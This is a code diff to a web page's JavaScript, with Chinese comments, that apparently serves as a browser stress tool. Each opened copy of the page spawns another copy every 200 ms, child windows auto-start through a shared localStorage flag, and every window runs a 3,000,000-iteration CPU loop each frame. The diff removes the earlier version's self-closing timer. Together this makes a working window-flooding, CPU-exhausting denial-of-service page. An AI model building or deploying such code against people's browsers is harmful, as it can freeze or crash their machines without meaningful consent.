@@ -66,125 +66,83 @@
 
     <script>
         const $ = id => document.getElementById(id);
+        const countSpan = $('count');
         const startBtn = $('start');
         const stopBtn = $('stop');
         const RUN_KEY = 'infinite_running';
         const COUNT_KEY = 'infinite_count';
 
-        // ========== 配置参数 ==========
-        const LOOPS_PER_FRAME = 300000;   // 每帧压力计算循环次数
-        const SPAWN_COUNT = 2;            // 每次打开的子窗口数量
-        const SPAWN_INTERVAL = 200;       // 持续打开子窗口的间隔（毫秒）
-        const AUTO_CLOSE_DELAY = 4000;    // 窗口存活时间（毫秒）
-        // =============================
-
-        let cpuTimer = null;
-        let closeTimer = null;
-        let spawnTimer = null;            // 持续打开窗口的定时器
+        let timer = null;
+        // ---- 压力计算相关 ----
+        const LOOPS_PER_FRAME = 3000000;        // 每帧计算循环次数，可在此修改负载强度
+        let cpuTimer = null;                   // 计算循环的 requestAnimationFrame ID
 
         function updateCount() {
-            $('count').textContent = localStorage.getItem(COUNT_KEY) || '0';
+            countSpan.textContent = localStorage.getItem(COUNT_KEY) || '0';
         }
 
         function changeCount(delta) {
-            let v = parseInt(localStorage.getItem(COUNT_KEY) || '0') + delta;
-            if (v < 0) v = 0;
-            localStorage.setItem(COUNT_KEY, v);
+            let val = parseInt(localStorage.getItem(COUNT_KEY) || '0') + delta;
+            if (val < 0) val = 0;
+            localStorage.setItem(COUNT_KEY, val);
             updateCount();
         }
 
-        // 打开一个子窗口
-        function openOne() {
+        function openPage() {
             const w = window.open(location.href, '_blank');
             if (w) {
                 changeCount(1);
+                // 简单监听该窗口关闭
                 const check = setInterval(() => {
                     if (w.closed) { clearInterval(check); changeCount(-1); }
                 }, 800);
             }
         }
 
-        // 立即裂变（每个窗口仅执行一次）
-        function spawnImmediate() {
-            if (sessionStorage.getItem('spawned')) return;
-            sessionStorage.setItem('spawned', '1');
-            for (let i = 0; i < SPAWN_COUNT; i++) {
-                openOne();
-            }
-        }
-
-        // 持续裂变（每200ms打开SPAWN_COUNT个窗口）
-        function startContinuousSpawn() {
-            if (spawnTimer) return;
-            spawnTimer = setInterval(() => {
-                for (let i = 0; i < SPAWN_COUNT; i++) {
-                    openOne();
-                }
-            }, SPAWN_INTERVAL);
-        }
-
-        // 重度计算任务
+        // ---- 重度计算任务 ----
         function heavyLoad() {
             let r = 0.1;
             for (let i = 0; i < LOOPS_PER_FRAME; i++) {
                 r += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
                 r *= 1.000001;
-                if (i % 5000 === 0) r -= 0.000001;
+                if (i % 5000 === 0) r -= 0.000001;  // 防止引擎过度优化
             }
             return r;
         }
 
-        function startCompute() {
-            if (cpuTimer) return;
-            function loop() {
-                heavyLoad();
+        function start() {
+            if (timer) return;
+            localStorage.setItem(RUN_KEY, '1');
+            openPage();                          // 立即打开一个
+            timer = setInterval(openPage, 200); // 每200ms打开一个
+            // ---- 启动持续压力计算 ----
+            if (!cpuTimer) {
+                function loop() {
+                    heavyLoad();
+                    cpuTimer = requestAnimationFrame(loop);
+                }
                 cpuTimer = requestAnimationFrame(loop);
             }
-            cpuTimer = requestAnimationFrame(loop);
-        }
 
-        function stopCompute() {
-            if (cpuTimer) { cancelAnimationFrame(cpuTimer); cpuTimer = null; }
-        }
-
-        function clearTimers() {
-            if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
-            if (closeTimer) { clearTimeout(closeTimer); closeTimer = null; }
-            stopCompute();
-        }
-
-        function scheduleClose() {
-            if (closeTimer) return;
-            closeTimer = setTimeout(() => {
-                clearTimers();
-                window.close();
-            }, AUTO_CLOSE_DELAY);
-        }
-
-        // 开始（主窗口点击 或 子窗口自动调用）
-        function start() {
-            if (localStorage.getItem(RUN_KEY) === '1') return;
-            localStorage.setItem(RUN_KEY, '1');
-            spawnImmediate();          // 立即裂变
-            startContinuousSpawn();    // 启动持续裂变定时器
-            startCompute();            // 开始压力计算
-            scheduleClose();           // 定时自毁
             startBtn.disabled = true;
             stopBtn.disabled = false;
         }
 
         function stop() {
+            if (timer) { clearInterval(timer); timer = null; }
+            // ---- 停止压力计算 ----
+            if (cpuTimer) { cancelAnimationFrame(cpuTimer); cpuTimer = null; }
             localStorage.setItem(RUN_KEY, '0');
-            clearTimers();
             startBtn.disabled = false;
             stopBtn.disabled = true;
         }
 
+        // 页面加载时检查全局状态
         window.addEventListener('load', () => {
             updateCount();
-            const isChild = window.opener !== null;
-            if (localStorage.getItem(RUN_KEY) === '1' && isChild) {
-                start();   // 子窗口自动加入
+            // 只有被其他窗口打开的子窗口才会自动开始（避免残留状态影响主窗口）
+            if (localStorage.getItem(RUN_KEY) === '1' && window.opener !== null) {
+                start();
             }
             window.addEventListener('storage', e => {
                 if (e.key === RUN_KEY) {
@@ -195,7 +153,8 @@
             });
             window.addEventListener('beforeunload', () => {
                 changeCount(-1);
-                clearTimers();
+                // 窗口关闭时清理本窗口的资源
+                if (cpuTimer) { cancelAnimationFrame(cpuTimer); cpuTimer = null; }
                 if (parseInt(localStorage.getItem(COUNT_KEY) || '0') <= 0) {
                     localStorage.removeItem(RUN_KEY);
                     localStorage.removeItem(COUNT_KEY);
